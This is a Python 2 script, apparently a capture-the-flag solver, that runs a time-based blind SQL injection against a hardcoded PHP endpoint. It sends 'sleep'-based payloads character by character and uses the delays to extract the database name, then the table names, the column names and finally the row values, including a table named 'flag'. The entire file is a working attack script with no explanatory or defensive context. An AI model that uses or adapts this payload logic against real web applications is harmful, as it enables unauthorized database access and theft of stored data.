#-*- coding: utf-8 -*-
from itertools import izip_longest
import requests
import sys
import time

url = "http://203.229.206.22/~wing608/b20138798adfhjklasg8213/1.php" # change URL
#answer = "hello" # change ANSWER

def data_res(payload) :
    
    data ={"frog" : payload}  #change DATA
    res = requests.post(url,data=data)
    return res




db=[]
dbname =''

for num2 in range(1,20) :  # DB 이름 찾기 
    for num in range(20,127) : 
        payload = "1 or if(ord(substr(database(),"+str(num2)+",1))="+str(num)+",sleep(0.9),1)#"
        #print payload
        #payload = "1 or if(length(database())>3,sleep(0.9),1)"
        t1 = time.time()
        res = data_res(payload)
        t2 = time.time()
        
        if t2-t1 > 1 : 
            
            print str(chr(num))
            dbname += str(chr(num))
            break
    
    if num == 126 : 
        break

    
db.append(dbname)            
print "DB name : " , db


table = []
for dbname in db : 
    for num3 in range(0,15) : 
        table_name = ''
        for num2 in range(1,30) :  # DB 이름 찾기 
            for num in range(20,127) : 
                payload = "1 or if(ord(substr((select table_name from information_schema.tables where table_schema=\'"+dbname+"\' limit "+str(num3)+",1),"+str(num2)+",1))="+str(num)+",sleep(0.9),1)#"
                #print payload 
                
                t1 = time.time()
                res = data_res(payload)
                t2 = time.time()
                
                if t2-t1 > 1 : 
                    print str(chr(num))
                    table_name += str(chr(num))
                    break
                
            if num == 126 : 
                    break
        
        if table_name == '':
            break
        
        table.append(table_name)
        print dbname,"'s table",num3," name : " , table_name
    


#table_name="mem"
table=['flag']
column = []
for table_name in table : 
    for num3 in range(0,15) : 
        column_name = ''    
        for num2 in range(1,30) :  # DB 이름 찾기 
            for num in range(20,127) : 
                payload = "1 or if(ord(substr((select column_name from information_schema.columns where table_name =\'"+table_name+"\' limit "+str(num3)+",1),"+str(num2)+",1))="+str(num)+",sleep(0.9),1)#"
                
                t1 = time.time()
                res = data_res(payload)
                t2 = time.time()
                
                if t2-t1 > 1 : 
                    
                    print str(chr(num))
                    column_name += str(chr(num))
                    break
                
                
            if num ==126 :
                break
                
        if column_name == '' :
            break 
        
        column.append(column_name)
        print table_name,"'s column",num3,"_name : ",column_name



value = []
for table_name in table :    
    for column_name in column : 
        for num3 in range(0,15) : 
            column_value = ''
            for num2 in range(1,30) :  # DB 이름 찾기 
                for num in range(20,127) : 
                    payload = "1 or if(ord(substr((select "+column_name+" from "+table_name+" limit "+str(num3)+",1),"+str(num2)+",1))="+str(num)+",sleep(0.9),1)#"
                   
                    t1 = time.time()
                    res = data_res(payload)
                    t2 = time.time()
                    
                    if t2-t1 > 1 : 
                        
                        print str(chr(num))
                        column_value += str(chr(num))
                        break
                
                    
                if num == 126 :
                    break
                
            if column_value == '' :
                break
                    
            value.append(column_value)
            print column_name,"'s value",num3," : " ,column_value           

